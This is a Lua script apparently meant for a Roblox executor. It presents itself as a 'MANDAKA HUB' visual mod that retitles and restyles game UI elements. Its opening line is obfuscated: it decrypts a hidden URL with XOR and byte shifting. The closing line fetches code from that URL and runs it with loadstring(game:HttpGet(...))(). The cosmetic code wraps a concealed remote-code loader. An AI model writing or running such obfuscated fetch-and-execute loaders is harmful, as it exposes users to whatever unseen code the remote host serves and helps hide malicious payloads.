
--[[ STAGE 2: VISUAL CORE ]]
local z6fxRwdXSJiB9ZV="\237\243\237\000\018\025\244\246\049\010\245\009\053\244\247\252\058\251\245\001\003\021\019\002\020\066\067\081\025\025\030\031\004"local f2saKpLPFkiDL1L4=233 local uYyDdB5o8HATHMKRrtb5=91 local isGzGsoryDfZt5jej=0 local uhV0xFbnPGEpJSpF=1 local ZyP0ZMZfsuNhtF=7 local L1VsVliLGRcitZYInyZIk_=true local YcOYeIvh5XKm=bit32 and bit32.bxor if not YcOYeIvh5XKm then YcOYeIvh5XKm=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local x2lsZNI2C4LxDCC={}for X8M0YH6fppwF3jyBs=1,#z6fxRwdXSJiB9ZV do local gxGF_LndPlAlmTUC86u5Y=string.byte(z6fxRwdXSJiB9ZV,X8M0YH6fppwF3jyBs)local KOyl_qfJNzao=(uYyDdB5o8HATHMKRrtb5+(X8M0YH6fppwF3jyBs*uhV0xFbnPGEpJSpF)+ZyP0ZMZfsuNhtF)%256 if isGzGsoryDfZt5jej==0 then gxGF_LndPlAlmTUC86u5Y=(gxGF_LndPlAlmTUC86u5Y-KOyl_qfJNzao)%256 x2lsZNI2C4LxDCC[X8M0YH6fppwF3jyBs]=string.char(YcOYeIvh5XKm(gxGF_LndPlAlmTUC86u5Y,f2saKpLPFkiDL1L4))else gxGF_LndPlAlmTUC86u5Y=YcOYeIvh5XKm(gxGF_LndPlAlmTUC86u5Y,f2saKpLPFkiDL1L4)x2lsZNI2C4LxDCC[X8M0YH6fppwF3jyBs]=string.char((gxGF_LndPlAlmTUC86u5Y-KOyl_qfJNzao)%256)end end local mmpHGckDI7MHUx0Tr=table.concat(x2lsZNI2C4LxDCC)if L1VsVliLGRcitZYInyZIk_ then mmpHGckDI7MHUx0Tr=string.reverse(mmpHGckDI7MHUx0Tr)end local AyV0m1OyTPpGV=mmpHGckDI7MHUx0Tr
local HubName = "MANDAKA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(AyV0m1OyTPpGV))()
